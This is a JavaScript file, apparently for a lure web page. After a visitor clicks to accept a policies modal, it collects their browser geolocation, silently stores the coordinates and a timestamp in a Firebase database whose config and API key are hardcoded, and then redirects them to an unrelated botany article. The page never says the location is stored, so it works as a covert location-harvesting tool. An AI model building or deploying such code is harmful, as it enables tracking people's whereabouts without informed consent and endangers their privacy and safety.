// Importar Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";

// Configuración de Firebase
const firebaseConfig = {
    apiKey: "AIzaSyDo4j7zm_poOFz5tRUkRULjxrZO2jlOuaM",
    authDomain: "ubicacionesweb.firebaseapp.com",
    databaseURL: "https://ubicacionesweb-default-rtdb.firebaseio.com",
    projectId: "ubicacionesweb",
    storageBucket: "ubicacionesweb.firebasestorage.app",
    messagingSenderId: "916561063858",
    appId: "1:916561063858:web:316104fb181e9377fabeab"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Función para obtener ubicación
function obtenerUbicacion() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                let lat = position.coords.latitude;
                let lon = position.coords.longitude;
                let timestamp = new Date().toLocaleString();

                // Guardar en Firebase
                push(ref(database, "ubicaciones"), {
                    latitud: lat,
                    longitud: lon,
                    fecha: timestamp
                }).then(() => {
                    console.log("Ubicación guardada en Firebase:", lat, lon);
                }).catch(error => {
                    console.error("Error al guardar ubicación:", error);
                });

                // Redirigir a otra página
                window.location.href = "https://concepto.de/botanica/";
            },
            function(error) {
                alert("Debes permitir el acceso a la ubicación.");
            }
        );
    } else {
        alert("Tu navegador no soporta geolocalización.");
    }
}

// Mostrar modal de políticas
document.getElementById("aceptar").addEventListener("click", function() {
    document.getElementById("politicas").style.display = "none";
    obtenerUbicacion();
});
